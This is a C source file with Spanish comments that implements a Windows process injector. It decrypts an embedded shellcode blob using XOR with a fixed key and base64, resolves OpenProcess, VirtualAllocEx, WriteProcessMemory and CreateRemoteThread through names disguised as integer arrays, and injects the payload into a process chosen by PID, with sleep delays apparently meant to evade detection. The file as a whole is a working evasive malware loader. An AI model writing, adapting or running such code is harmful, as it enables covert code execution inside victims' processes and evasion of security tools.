#include <stdio.h>
#include "include/funciones.h"

LPCSTR shellcode_cifrada = "9EE2A6E9E7EB88D6BBF0FA8DECF4E19DFC84F99FEC9AEBF281C9FBCB9CE4A6E895FCA5FDEEA4C5F8CEFEE4B5E885CDB5E4FEABFDC597BFE686EF84F39FF5F38DDFF5DFA7CB93F2BFF089F9F9B5FC80E58ECE9AD2FBEF86F3EE99C4FDF2A6EE9EEAA6C185F0DF8FE1D6EEA8EC93FA8EF0A4D2F9FCF781C08D9D94F880EA8ED9FEA59DF0C09CFC9AEAF88896F894F4C1F3CEB5FE9BE88DF19BE5EF84E7E2E387ECA0FE84FBB5E08A8EECD2E2FB999AE3B4ED8DFFF686ECD9E180C9948AFEFFA4F4D2FCECDAF49EE583E1A7FE80F5FEA4E8D8978ECE81EA84E89DE8C889C4F4C08D9D97FD95E89AD9DE9BFBC1E598E894E19DEFBCF8DCE7DAD6F699E1FD8F8AD18EE6EDBCE4D8DF83DD8494E396E3808A85D8D6E28EEC93FA8DF88DF0FA9FE483E98EFC97FA8DFC8B87F695D9C7CFE08284CEE3FAFDDED796EFC4D6AEFBA4E1FF96FDE4D288D5F2C0F7EFBCCC87DE9CC7DCA8FCE6909DD59CC2AE8BA3F0EC99EAFB95B98284E2FE88A7FDD69A99EBF68E90";

CHAR arreglo_OpenProcess[] = { 79, 112, 101, 110, 80, 114, 111, 99, 101, 115, 115, 0 };
CHAR arreglo_VirtualAllocEx[] = { 86, 105, 114, 116, 117, 97, 108, 65, 108, 108, 111, 99, 69, 120, 0 };
CHAR arreglo_WriteProcessMemory[] = { 87, 114, 105, 116, 101, 80, 114, 111, 99, 101, 115, 115, 77, 101, 109, 111, 114, 121, 0 };
CHAR arreglo_CreateRemoteThread[] = { 67, 114, 101, 97, 116, 101, 82, 101, 109, 111, 116, 101, 84, 104, 114, 101, 97, 100, 0 };

INT _tmain(INT argc, CHAR *argv[]) {
    BYTE *shellcode = NULL; //contiene la shellcode original
    DWORD shellcode_tam = 0; //tamaño de la shellcode original
    BYTE *shellcode_cifrada_bytes = NULL; //contiene la shellcode en bytes (despues de convertir de hex a bytes)
    DWORD shellcode_cifrada_tam = 0; //tamaño de la shellcode cifrada
    BYTE shellcode_decifrada[2024]; //arreglo para guardar temporalmente la shellcode decifrada
    BYTE clave[] = "NX0R-D3F3ND3R"; // clave de decifrado para xor

    if (argc != 2) {
        printf("Uso: %s <PID>\n", argv[0]);
        return -1;
    }

    INT pid = atoi(argv[1]);

    //carga y usa dinamicamente las funciones, es decir, en tiempo de ejecucion usando GetProcAddress
    HANDLE (*pOpenProcess)(DWORD, BOOL, DWORD) = (HANDLE(*)(DWORD, BOOL, DWORD))construir_funcion((CONST CHAR*)arreglo_OpenProcess);
    LPVOID (*pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))construir_funcion((CONST CHAR*)arreglo_VirtualAllocEx);
    BOOL (*pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) = (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))construir_funcion((CONST CHAR*)arreglo_WriteProcessMemory);
    HANDLE (*pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD) = (HANDLE(*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))construir_funcion((CONST CHAR*)arreglo_CreateRemoteThread);

    // decifra y decodifica la shellcode
    convertir_hex_a_bytes(shellcode_cifrada, &shellcode_cifrada_bytes, &shellcode_cifrada_tam);
    NXOR(shellcode_cifrada_bytes, clave, shellcode_decifrada, shellcode_cifrada_tam);
    decodificar_base64((CONST CHAR *)shellcode_decifrada, &shellcode, &shellcode_tam);

    // proceso de inyeccion usando CreateRemoteThread + delays
    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
    //asigna memoria (un buffer) para la shellcode, en el espacio de direcciones del otro proceso 
    LPVOID hAlloc = pVirtualAllocEx(hProcess, NULL, shellcode_tam, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    SleepEx(5000, FALSE);
    // escribe la shellcode en el buffer asignado por VirtualAllocEx()
    pWriteProcessMemory(hProcess, hAlloc, shellcode, shellcode_tam, NULL);
    SleepEx(10000, FALSE);
    // crea un hilo en el proceso remoto (proceso objetivo), se le pasa CREATE_SUSPENDED para crear el hilo suspendido
    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hAlloc, NULL, CREATE_SUSPENDED, NULL);
    SleepEx(5000, FALSE);
    ResumeThread(hThread);

    CloseHandle(hProcess);

    return 0;
}
